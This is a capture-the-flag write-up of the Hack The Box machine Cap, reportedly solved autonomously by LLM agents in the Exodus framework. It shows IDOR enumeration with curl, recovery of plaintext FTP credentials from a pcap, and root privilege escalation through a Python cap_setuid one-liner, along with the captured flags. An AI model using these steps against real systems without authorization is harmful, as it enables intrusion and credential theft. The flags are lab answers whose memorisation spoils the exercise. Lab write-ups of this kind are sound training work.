# HTB Cap - Writeup (Automated Solve by Exodus)

This report documents the full compromise of the Hack The Box machine Cap (10.129.34.4), performed by LLM agents via the Exodus automated framework.

## 1. Service Discovery (Reconnaissance)
The process began with a comprehensive port scan to identify open services and their versions.

**Nmap Scan Results:**
```text
PORT   STATE SERVICE REASON         VERSION                                      
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3                                 
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 gunicorn                                     
| http-title: Security Dashboard
```
The scan revealed an FTP server, an SSH service, and a web application titled Security Dashboard running on Gunicorn.

## 2. Web Enumeration and IDOR Discovery
The web exploit agent analyzed the Security Dashboard. It found that the application generates network captures and exposes them via the /data/<id> endpoint. A logic vulnerability (Insecure Direct Object Reference - IDOR) was suspected in how the application handles these IDs.

**IDOR Verification Log:**
The agent ran a loop to check for the existence of historical data captures:
```bash
nathan@cap:~$ for i in {0..10}; do echo -n "ID $i: "; curl -s -I http://10.129.34.4/data/$i | grep HTTP; done
ID 0: HTTP/1.1 200 OK                                                            
ID 1: HTTP/1.1 200 OK                                                            
ID 2: HTTP/1.1 200 OK                                                            
ID 3: HTTP/1.1 200 OK                                                            
ID 4: HTTP/1.1 200 OK                                                            
ID 5: HTTP/1.1 200 OK                                                            
ID 6: HTTP/1.1 200 OK                                                            
ID 7: HTTP/1.1 200 OK                                                            
ID 8: HTTP/1.1 200 OK                                                            
ID 9: HTTP/1.1 302 FOUND                                                         
ID 10: HTTP/1.1 302 FOUND
```
The result confirmed that data IDs 0 through 8 were accessible, even though the agent's current session was redirected to a higher ID.

## 3. Exploitation: Credential Harvesting
The agent targeted ID 0, assuming it might contain sensitive historical traffic. It downloaded data0.pcap and analyzed it using tcpdump.

**Credential Extraction from PCAP:**
```text
nathan@cap:~$ tcpdump -r data0.pcap -A | grep "USER"
13:12:54.084642 IP 192.168.196.1.54411 > 192.168.196.16.ftp: FTP: USER nathan

nathan@cap:~$ tcpdump -r data0.pcap -A | grep -i "pass"
13:12:55.383140 IP 192.168.196.1.54411 > 192.168.196.16.ftp: FTP: PASS Buck3tH4TF0RM3!
```
The analysis successfully recovered plaintext FTP credentials for the user nathan:
* Username: nathan
* Password: Buck3tH4TF0RM3!

## 4. Initial Access (User Shell)
The agent used the recovered credentials to log in via SSH and retrieve the user flag.

**SSH Login and User Flag:**
```bash
nathan@cap:~$ id && cat user.txt
uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
dcaa46c32826fc3308c66d39904f7127
```

## 5. Privilege Escalation (PrivEsc)
The privilege escalation agent performed local enumeration, looking for misconfigurations. It focused on Linux Capabilities instead of standard SUID binaries.

**Capabilities Enumeration:**
```bash
nathan@cap:~$ getcap -r / 2>/dev/null
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
```
The /usr/bin/python3.8 binary was found to have the cap_setuid capability. This allows the Python interpreter to change its effective UID to 0 (root).

**Exploitation of Python Capabilities:**
The agent executed a Python one-liner to set the UID to 0 and spawn a bash shell:
```bash
nathan@cap:~$ python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@cap:~# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
```

## 6. Root Flag Capture
With root privileges established, the final flag was retrieved.

**Final Flag Extraction:**
```bash
root@cap:~# id && cat /root/root.txt
uid=0(root) gid=1001(nathan) groups=1001(nathan)                                 
081902fbe5a2b4a14eb9c45acd9418aa
```

***

## Vulnerability Summary
1. Insecure Direct Object Reference (IDOR): The web application failed to validate session ownership for generated PCAP files, allowing any user to download traffic logs from other sessions.
2. Cleartext Protocol Usage (FTP): Credentials were transmitted in plaintext, allowing their recovery from a captured network trace.
3. Insecure Binary Capabilities: The cap_setuid capability on a versatile tool like Python 3.8 provided a direct and trivial path to root for any user on the system.

**Compromise status: Successful**

**Solver: Exodus Swarm**

[https://github.com/exodialabsxyz/exodus](https://github.com/exodialabsxyz/exodus)

[HTB Achievement Link](https://labs.hackthebox.com/achievement/machine/2999449/351)
